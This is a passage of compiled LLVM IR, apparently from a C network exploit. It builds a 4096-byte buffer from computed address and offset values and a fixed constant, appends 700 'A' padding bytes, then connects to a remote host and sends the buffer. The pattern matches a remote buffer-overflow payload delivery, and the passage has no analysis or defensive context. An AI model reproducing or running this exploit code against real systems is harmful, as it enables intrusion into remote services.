  %433 = add nsw i32 %431, %432
  %434 = sext i32 %433 to i64
  %435 = load i32, i32* %24, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %436
  %438 = bitcast i8* %437 to i64*
  store i64 %434, i64* %438, align 1
  %439 = load i32, i32* %24, align 4
  %440 = add nsw i32 %439, 4
  store i32 %440, i32* %24, align 4
  %441 = load i32, i32* %18, align 4
  %442 = sext i32 %441 to i64
  %443 = load i32, i32* %24, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %444
  %446 = bitcast i8* %445 to i64*
  store i64 %442, i64* %446, align 1
  %447 = load i32, i32* %24, align 4
  %448 = add nsw i32 %447, 4
  store i32 %448, i32* %24, align 4
  %449 = load i32, i32* %25, align 4
  %450 = add nsw i32 %449, 2
  store i32 %450, i32* %25, align 4
  %451 = load i32, i32* %6, align 4
  %452 = sext i32 %451 to i64
  %453 = load i32, i32* %24, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %454
  %456 = bitcast i8* %455 to i64*
  store i64 %452, i64* %456, align 1
  %457 = load i32, i32* %24, align 4
  %458 = add nsw i32 %457, 4
  store i32 %458, i32* %24, align 4
  %459 = load i32, i32* %7, align 4
  %460 = sext i32 %459 to i64
  %461 = load i32, i32* %24, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %462
  %464 = bitcast i8* %463 to i64*
  store i64 %460, i64* %464, align 1
  %465 = load i32, i32* %24, align 4
  %466 = add nsw i32 %465, 4
  store i32 %466, i32* %24, align 4
  %467 = load i32, i32* %8, align 4
  %468 = load i32, i32* %25, align 4
  %469 = add nsw i32 %467, %468
  %470 = sext i32 %469 to i64
  %471 = load i32, i32* %24, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %472
  %474 = bitcast i8* %473 to i64*
  store i64 %470, i64* %474, align 1
  %475 = load i32, i32* %24, align 4
  %476 = add nsw i32 %475, 4
  store i32 %476, i32* %24, align 4
  %477 = load i32, i32* %14, align 4
  %478 = sext i32 %477 to i64
  %479 = load i32, i32* %24, align 4
  %480 = sext i32 %479 to i64
  %481 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %480
  %482 = bitcast i8* %481 to i64*
  store i64 %478, i64* %482, align 1
  %483 = load i32, i32* %24, align 4
  %484 = add nsw i32 %483, 4
  store i32 %484, i32* %24, align 4
  %485 = load i32, i32* %25, align 4
  %486 = add nsw i32 %485, 1
  store i32 %486, i32* %25, align 4
  store i32 0, i32* %27, align 4
  br label %487

487:                                              ; preds = %624, %178
  %488 = load i32, i32* %27, align 4
  %489 = icmp slt i32 %488, 10
  br i1 %489, label %490, label %627

490:                                              ; preds = %487
  %491 = load i32, i32* %6, align 4
  %492 = sext i32 %491 to i64
  %493 = load i32, i32* %24, align 4
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %494
  %496 = bitcast i8* %495 to i64*
  store i64 %492, i64* %496, align 1
  %497 = load i32, i32* %24, align 4
  %498 = add nsw i32 %497, 4
  store i32 %498, i32* %24, align 4
  %499 = load i32, i32* %7, align 4
  %500 = sext i32 %499 to i64
  %501 = load i32, i32* %24, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %502
  %504 = bitcast i8* %503 to i64*
  store i64 %500, i64* %504, align 1
  %505 = load i32, i32* %24, align 4
  %506 = add nsw i32 %505, 4
  store i32 %506, i32* %24, align 4
  %507 = load i32, i32* %8, align 4
  %508 = load i32, i32* %25, align 4
  %509 = add nsw i32 %507, %508
  %510 = sext i32 %509 to i64
  %511 = load i32, i32* %24, align 4
  %512 = sext i32 %511 to i64
  %513 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %512
  %514 = bitcast i8* %513 to i64*
  store i64 %510, i64* %514, align 1
  %515 = load i32, i32* %24, align 4
  %516 = add nsw i32 %515, 4
  store i32 %516, i32* %24, align 4
  %517 = load i32, i32* %27, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds [256 x i8], [256 x i8]* %32, i64 0, i64 %518
  %520 = load i8, i8* %519, align 1
  %521 = zext i8 %520 to i32
  switch i32 %521, label %621 [
    i32 48, label %522
    i32 49, label %531
    i32 50, label %541
    i32 51, label %551
    i32 52, label %561
    i32 53, label %571
    i32 54, label %581
    i32 55, label %591
    i32 56, label %601
    i32 57, label %611
  ]

522:                                              ; preds = %490
  %523 = load i32, i32* %10, align 4
  %524 = sext i32 %523 to i64
  %525 = load i32, i32* %24, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %526
  %528 = bitcast i8* %527 to i64*
  store i64 %524, i64* %528, align 1
  %529 = load i32, i32* %24, align 4
  %530 = add nsw i32 %529, 4
  store i32 %530, i32* %24, align 4
  br label %621

531:                                              ; preds = %490
  %532 = load i32, i32* %10, align 4
  %533 = add nsw i32 %532, 1
  %534 = sext i32 %533 to i64
  %535 = load i32, i32* %24, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %536
  %538 = bitcast i8* %537 to i64*
  store i64 %534, i64* %538, align 1
  %539 = load i32, i32* %24, align 4
  %540 = add nsw i32 %539, 4
  store i32 %540, i32* %24, align 4
  br label %621

541:                                              ; preds = %490
  %542 = load i32, i32* %10, align 4
  %543 = add nsw i32 %542, 2
  %544 = sext i32 %543 to i64
  %545 = load i32, i32* %24, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %546
  %548 = bitcast i8* %547 to i64*
  store i64 %544, i64* %548, align 1
  %549 = load i32, i32* %24, align 4
  %550 = add nsw i32 %549, 4
  store i32 %550, i32* %24, align 4
  br label %621

551:                                              ; preds = %490
  %552 = load i32, i32* %10, align 4
  %553 = add nsw i32 %552, 3
  %554 = sext i32 %553 to i64
  %555 = load i32, i32* %24, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %556
  %558 = bitcast i8* %557 to i64*
  store i64 %554, i64* %558, align 1
  %559 = load i32, i32* %24, align 4
  %560 = add nsw i32 %559, 4
  store i32 %560, i32* %24, align 4
  br label %621

561:                                              ; preds = %490
  %562 = load i32, i32* %10, align 4
  %563 = add nsw i32 %562, 4
  %564 = sext i32 %563 to i64
  %565 = load i32, i32* %24, align 4
  %566 = sext i32 %565 to i64
  %567 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %566
  %568 = bitcast i8* %567 to i64*
  store i64 %564, i64* %568, align 1
  %569 = load i32, i32* %24, align 4
  %570 = add nsw i32 %569, 4
  store i32 %570, i32* %24, align 4
  br label %621

571:                                              ; preds = %490
  %572 = load i32, i32* %10, align 4
  %573 = add nsw i32 %572, 5
  %574 = sext i32 %573 to i64
  %575 = load i32, i32* %24, align 4
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %576
  %578 = bitcast i8* %577 to i64*
  store i64 %574, i64* %578, align 1
  %579 = load i32, i32* %24, align 4
  %580 = add nsw i32 %579, 4
  store i32 %580, i32* %24, align 4
  br label %621

581:                                              ; preds = %490
  %582 = load i32, i32* %10, align 4
  %583 = add nsw i32 %582, 6
  %584 = sext i32 %583 to i64
  %585 = load i32, i32* %24, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %586
  %588 = bitcast i8* %587 to i64*
  store i64 %584, i64* %588, align 1
  %589 = load i32, i32* %24, align 4
  %590 = add nsw i32 %589, 4
  store i32 %590, i32* %24, align 4
  br label %621

591:                                              ; preds = %490
  %592 = load i32, i32* %10, align 4
  %593 = add nsw i32 %592, 7
  %594 = sext i32 %593 to i64
  %595 = load i32, i32* %24, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %596
  %598 = bitcast i8* %597 to i64*
  store i64 %594, i64* %598, align 1
  %599 = load i32, i32* %24, align 4
  %600 = add nsw i32 %599, 4
  store i32 %600, i32* %24, align 4
  br label %621

601:                                              ; preds = %490
  %602 = load i32, i32* %10, align 4
  %603 = add nsw i32 %602, 8
  %604 = sext i32 %603 to i64
  %605 = load i32, i32* %24, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %606
  %608 = bitcast i8* %607 to i64*
  store i64 %604, i64* %608, align 1
  %609 = load i32, i32* %24, align 4
  %610 = add nsw i32 %609, 4
  store i32 %610, i32* %24, align 4
  br label %621

611:                                              ; preds = %490
  %612 = load i32, i32* %10, align 4
  %613 = add nsw i32 %612, 9
  %614 = sext i32 %613 to i64
  %615 = load i32, i32* %24, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %616
  %618 = bitcast i8* %617 to i64*
  store i64 %614, i64* %618, align 1
  %619 = load i32, i32* %24, align 4
  %620 = add nsw i32 %619, 4
  store i32 %620, i32* %24, align 4
  br label %621

621:                                              ; preds = %490, %611, %601, %591, %581, %571, %561, %551, %541, %531, %522
  %622 = load i32, i32* %25, align 4
  %623 = add nsw i32 %622, 1
  store i32 %623, i32* %25, align 4
  br label %624

624:                                              ; preds = %621
  %625 = load i32, i32* %27, align 4
  %626 = add nsw i32 %625, 1
  store i32 %626, i32* %27, align 4
  br label %487

627:                                              ; preds = %487
  %628 = load i32, i32* %6, align 4
  %629 = sext i32 %628 to i64
  %630 = load i32, i32* %24, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %631
  %633 = bitcast i8* %632 to i64*
  store i64 %629, i64* %633, align 1
  %634 = load i32, i32* %24, align 4
  %635 = add nsw i32 %634, 4
  store i32 %635, i32* %24, align 4
  %636 = load i32, i32* %7, align 4
  %637 = sext i32 %636 to i64
  %638 = load i32, i32* %24, align 4
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %639
  %641 = bitcast i8* %640 to i64*
  store i64 %637, i64* %641, align 1
  %642 = load i32, i32* %24, align 4
  %643 = add nsw i32 %642, 4
  store i32 %643, i32* %24, align 4
  %644 = load i32, i32* %8, align 4
  %645 = load i32, i32* %25, align 4
  %646 = add nsw i32 %644, %645
  %647 = sext i32 %646 to i64
  %648 = load i32, i32* %24, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %649
  %651 = bitcast i8* %650 to i64*
  store i64 %647, i64* %651, align 1
  %652 = load i32, i32* %24, align 4
  %653 = add nsw i32 %652, 4
  store i32 %653, i32* %24, align 4
  %654 = load i32, i32* %14, align 4
  %655 = sext i32 %654 to i64
  %656 = load i32, i32* %24, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %657
  %659 = bitcast i8* %658 to i64*
  store i64 %655, i64* %659, align 1
  %660 = load i32, i32* %24, align 4
  %661 = add nsw i32 %660, 4
  store i32 %661, i32* %24, align 4
  %662 = load i32, i32* %25, align 4
  %663 = add nsw i32 %662, 1
  store i32 %663, i32* %25, align 4
  %664 = load i32, i32* %6, align 4
  %665 = sext i32 %664 to i64
  %666 = load i32, i32* %24, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %667
  %669 = bitcast i8* %668 to i64*
  store i64 %665, i64* %669, align 1
  %670 = load i32, i32* %24, align 4
  %671 = add nsw i32 %670, 4
  store i32 %671, i32* %24, align 4
  %672 = load i32, i32* %7, align 4
  %673 = sext i32 %672 to i64
  %674 = load i32, i32* %24, align 4
  %675 = sext i32 %674 to i64
  %676 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %675
  %677 = bitcast i8* %676 to i64*
  store i64 %673, i64* %677, align 1
  %678 = load i32, i32* %24, align 4
  %679 = add nsw i32 %678, 4
  store i32 %679, i32* %24, align 4
  %680 = load i32, i32* %8, align 4
  %681 = load i32, i32* %25, align 4
  %682 = add nsw i32 %680, %681
  %683 = sext i32 %682 to i64
  %684 = load i32, i32* %24, align 4
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %685
  %687 = bitcast i8* %686 to i64*
  store i64 %683, i64* %687, align 1
  %688 = load i32, i32* %24, align 4
  %689 = add nsw i32 %688, 4
  store i32 %689, i32* %24, align 4
  %690 = load i32, i32* %19, align 4
  %691 = sext i32 %690 to i64
  %692 = load i32, i32* %24, align 4
  %693 = sext i32 %692 to i64
  %694 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %693
  %695 = bitcast i8* %694 to i64*
  store i64 %691, i64* %695, align 1
  %696 = load i32, i32* %24, align 4
  %697 = add nsw i32 %696, 4
  store i32 %697, i32* %24, align 4
  %698 = load i32, i32* %25, align 4
  %699 = add nsw i32 %698, 5
  store i32 %699, i32* %25, align 4
  %700 = load i32, i32* %6, align 4
  %701 = sext i32 %700 to i64
  %702 = load i32, i32* %24, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %703
  %705 = bitcast i8* %704 to i64*
  store i64 %701, i64* %705, align 1
  %706 = load i32, i32* %24, align 4
  %707 = add nsw i32 %706, 4
  store i32 %707, i32* %24, align 4
  %708 = load i32, i32* %7, align 4
  %709 = sext i32 %708 to i64
  %710 = load i32, i32* %24, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %711
  %713 = bitcast i8* %712 to i64*
  store i64 %709, i64* %713, align 1
  %714 = load i32, i32* %24, align 4
  %715 = add nsw i32 %714, 4
  store i32 %715, i32* %24, align 4
  %716 = load i32, i32* %8, align 4
  %717 = load i32, i32* %25, align 4
  %718 = add nsw i32 %716, %717
  %719 = sext i32 %718 to i64
  %720 = load i32, i32* %24, align 4
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %721
  %723 = bitcast i8* %722 to i64*
  store i64 %719, i64* %723, align 1
  %724 = load i32, i32* %24, align 4
  %725 = add nsw i32 %724, 4
  store i32 %725, i32* %24, align 4
  %726 = load i32, i32* %13, align 4
  %727 = sext i32 %726 to i64
  %728 = load i32, i32* %24, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %729
  %731 = bitcast i8* %730 to i64*
  store i64 %727, i64* %731, align 1
  %732 = load i32, i32* %24, align 4
  %733 = add nsw i32 %732, 4
  store i32 %733, i32* %24, align 4
  %734 = load i32, i32* %25, align 4
  %735 = add nsw i32 %734, 1
  store i32 %735, i32* %25, align 4
  %736 = load i32, i32* %6, align 4
  %737 = sext i32 %736 to i64
  %738 = load i32, i32* %24, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %739
  %741 = bitcast i8* %740 to i64*
  store i64 %737, i64* %741, align 1
  %742 = load i32, i32* %24, align 4
  %743 = add nsw i32 %742, 4
  store i32 %743, i32* %24, align 4
  %744 = load i32, i32* %7, align 4
  %745 = sext i32 %744 to i64
  %746 = load i32, i32* %24, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %747
  %749 = bitcast i8* %748 to i64*
  store i64 %745, i64* %749, align 1
  %750 = load i32, i32* %24, align 4
  %751 = add nsw i32 %750, 4
  store i32 %751, i32* %24, align 4
  %752 = load i32, i32* %8, align 4
  %753 = load i32, i32* %25, align 4
  %754 = add nsw i32 %752, %753
  %755 = sext i32 %754 to i64
  %756 = load i32, i32* %24, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %757
  %759 = bitcast i8* %758 to i64*
  store i64 %755, i64* %759, align 1
  %760 = load i32, i32* %24, align 4
  %761 = add nsw i32 %760, 4
  store i32 %761, i32* %24, align 4
  %762 = load i32, i32* %9, align 4
  %763 = sext i32 %762 to i64
  %764 = load i32, i32* %24, align 4
  %765 = sext i32 %764 to i64
  %766 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %765
  %767 = bitcast i8* %766 to i64*
  store i64 %763, i64* %767, align 1
  %768 = load i32, i32* %24, align 4
  %769 = add nsw i32 %768, 4
  store i32 %769, i32* %24, align 4
  %770 = load i32, i32* %6, align 4
  %771 = sext i32 %770 to i64
  %772 = load i32, i32* %24, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %773
  %775 = bitcast i8* %774 to i64*
  store i64 %771, i64* %775, align 1
  %776 = load i32, i32* %24, align 4
  %777 = add nsw i32 %776, 4
  store i32 %777, i32* %24, align 4
  %778 = load i32, i32* %7, align 4
  %779 = sext i32 %778 to i64
  %780 = load i32, i32* %24, align 4
  %781 = sext i32 %780 to i64
  %782 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %781
  %783 = bitcast i8* %782 to i64*
  store i64 %779, i64* %783, align 1
  %784 = load i32, i32* %24, align 4
  %785 = add nsw i32 %784, 4
  store i32 %785, i32* %24, align 4
  %786 = load i32, i32* %9, align 4
  %787 = sub nsw i32 %786, 40
  %788 = sext i32 %787 to i64
  %789 = load i32, i32* %24, align 4
  %790 = sext i32 %789 to i64
  %791 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %790
  %792 = bitcast i8* %791 to i64*
  store i64 %788, i64* %792, align 1
  %793 = load i32, i32* %24, align 4
  %794 = add nsw i32 %793, 4
  store i32 %794, i32* %24, align 4
  %795 = load i32, i32* %8, align 4
  %796 = add nsw i32 %795, 3
  %797 = sext i32 %796 to i64
  %798 = load i32, i32* %24, align 4
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %799
  %801 = bitcast i8* %800 to i64*
  store i64 %797, i64* %801, align 1
  %802 = load i32, i32* %24, align 4
  %803 = add nsw i32 %802, 4
  store i32 %803, i32* %24, align 4
  %804 = load i32, i32* %6, align 4
  %805 = sext i32 %804 to i64
  %806 = load i32, i32* %24, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %807
  %809 = bitcast i8* %808 to i64*
  store i64 %805, i64* %809, align 1
  %810 = load i32, i32* %24, align 4
  %811 = add nsw i32 %810, 4
  store i32 %811, i32* %24, align 4
  %812 = load i32, i32* %7, align 4
  %813 = sext i32 %812 to i64
  %814 = load i32, i32* %24, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %815
  %817 = bitcast i8* %816 to i64*
  store i64 %813, i64* %817, align 1
  %818 = load i32, i32* %24, align 4
  %819 = add nsw i32 %818, 4
  store i32 %819, i32* %24, align 4
  %820 = load i32, i32* %8, align 4
  %821 = load i32, i32* %25, align 4
  %822 = add nsw i32 %820, %821
  %823 = sext i32 %822 to i64
  %824 = load i32, i32* %24, align 4
  %825 = sext i32 %824 to i64
  %826 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %825
  %827 = bitcast i8* %826 to i64*
  store i64 %823, i64* %827, align 1
  %828 = load i32, i32* %24, align 4
  %829 = add nsw i32 %828, 4
  store i32 %829, i32* %24, align 4
  %830 = load i32, i32* %9, align 4
  %831 = sub nsw i32 %830, 40
  %832 = sext i32 %831 to i64
  %833 = load i32, i32* %24, align 4
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %834
  %836 = bitcast i8* %835 to i64*
  store i64 %832, i64* %836, align 1
  %837 = load i32, i32* %24, align 4
  %838 = add nsw i32 %837, 4
  store i32 %838, i32* %24, align 4
  %839 = load i32, i32* %25, align 4
  %840 = add nsw i32 %839, 24
  store i32 %840, i32* %25, align 4
  %841 = load i32, i32* %6, align 4
  %842 = sext i32 %841 to i64
  %843 = load i32, i32* %24, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %844
  %846 = bitcast i8* %845 to i64*
  store i64 %842, i64* %846, align 1
  %847 = load i32, i32* %24, align 4
  %848 = add nsw i32 %847, 4
  store i32 %848, i32* %24, align 4
  %849 = load i32, i32* %7, align 4
  %850 = sext i32 %849 to i64
  %851 = load i32, i32* %24, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %852
  %854 = bitcast i8* %853 to i64*
  store i64 %850, i64* %854, align 1
  %855 = load i32, i32* %24, align 4
  %856 = add nsw i32 %855, 4
  store i32 %856, i32* %24, align 4
  %857 = load i32, i32* %8, align 4
  %858 = load i32, i32* %25, align 4
  %859 = add nsw i32 %857, %858
  %860 = sext i32 %859 to i64
  %861 = load i32, i32* %24, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %862
  %864 = bitcast i8* %863 to i64*
  store i64 %860, i64* %864, align 1
  %865 = load i32, i32* %24, align 4
  %866 = add nsw i32 %865, 4
  store i32 %866, i32* %24, align 4
  %867 = load i32, i32* %9, align 4
  %868 = sext i32 %867 to i64
  %869 = load i32, i32* %24, align 4
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %870
  %872 = bitcast i8* %871 to i64*
  store i64 %868, i64* %872, align 1
  %873 = load i32, i32* %24, align 4
  %874 = add nsw i32 %873, 4
  store i32 %874, i32* %24, align 4
  %875 = load i32, i32* %20, align 4
  %876 = sext i32 %875 to i64
  %877 = load i32, i32* %24, align 4
  %878 = sext i32 %877 to i64
  %879 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %878
  %880 = bitcast i8* %879 to i64*
  store i64 %876, i64* %880, align 1
  %881 = load i32, i32* %24, align 4
  %882 = add nsw i32 %881, 4
  store i32 %882, i32* %24, align 4
  %883 = load i32, i32* %24, align 4
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %884
  %886 = bitcast i8* %885 to i64*
  store i64 2189591170, i64* %886, align 1
  %887 = load i32, i32* %24, align 4
  %888 = add nsw i32 %887, 4
  store i32 %888, i32* %24, align 4
  %889 = load i32, i32* %8, align 4
  %890 = sext i32 %889 to i64
  %891 = load i32, i32* %24, align 4
  %892 = sext i32 %891 to i64
  %893 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %892
  %894 = bitcast i8* %893 to i64*
  store i64 %890, i64* %894, align 1
  %895 = load i32, i32* %24, align 4
  %896 = add nsw i32 %895, 4
  store i32 %896, i32* %24, align 4
  %897 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 0
  %898 = load i32, i32* %24, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds i8, i8* %897, i64 %899
  %901 = call i32 (i8*, i8*, ...) @sprintf(i8* %900, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.15, i64 0, i64 0))
  %902 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 0
  %903 = call i32 @strlen(i8* %902)
  store i32 %903, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %904

904:                                              ; preds = %912, %627
  %905 = load i32, i32* %25, align 4
  %906 = icmp slt i32 %905, 700
  br i1 %906, label %907, label %915

907:                                              ; preds = %904
  %908 = load i32, i32* %24, align 4
  %909 = add nsw i32 %908, 1
  store i32 %909, i32* %24, align 4
  %910 = sext i32 %908 to i64
  %911 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %910
  store i8 65, i8* %911, align 1
  br label %912

912:                                              ; preds = %907
  %913 = load i32, i32* %25, align 4
  %914 = add nsw i32 %913, 1
  store i32 %914, i32* %25, align 4
  br label %904

915:                                              ; preds = %904
  %916 = load i32, i32* %24, align 4
  %917 = add nsw i32 %916, 1
  store i32 %917, i32* %24, align 4
  %918 = sext i32 %916 to i64
  %919 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %918
  store i8 10, i8* %919, align 1
  %920 = load i32, i32* %24, align 4
  %921 = add nsw i32 %920, 1
  store i32 %921, i32* %24, align 4
  %922 = sext i32 %920 to i64
  %923 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %922
  store i8 10, i8* %923, align 1
  %924 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 0
  %925 = call i32 @strlen(i8* %924)
  %926 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.16, i64 0, i64 0), i32 %925)
  %927 = load i32, i32* %26, align 4
  %928 = bitcast %struct.sockaddr_in* %22 to %struct.sockaddr*
  %929 = call i32 @connect(i32 %927, %struct.sockaddr* %928, i32 4)
  store i32 %929, i32* %25, align 4
  %930 = load i32, i32* %25, align 4
  %931 = icmp eq i32 %930, -1
  br i1 %931, label %932, label %934

932:                                              ; preds = %915
  %933 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.17, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %945

934:                                              ; preds = %915
  %935 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.18, i64 0, i64 0))
  %936 = load i32, i32* %26, align 4
  %937 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 0
  %938 = load i32, i32* %24, align 4
  %939 = call i32 @send(i32 %936, i8* %937, i32 %938, i32 0)
  br label %940

940:                                              ; preds = %934
  %941 = load i32, i32* %26, align 4
  %942 = call i32 @close(i32 %941)
  %943 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.19, i64 0, i64 0))
  %944 = call i32 @exit(i32 0) #4
  unreachable

945:                                              ; preds = %932, %142, %134
  %946 = load i32, i32* %3, align 4
  ret i32 %946
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @sscanf(i8*, i8*, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @bzero(i32*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
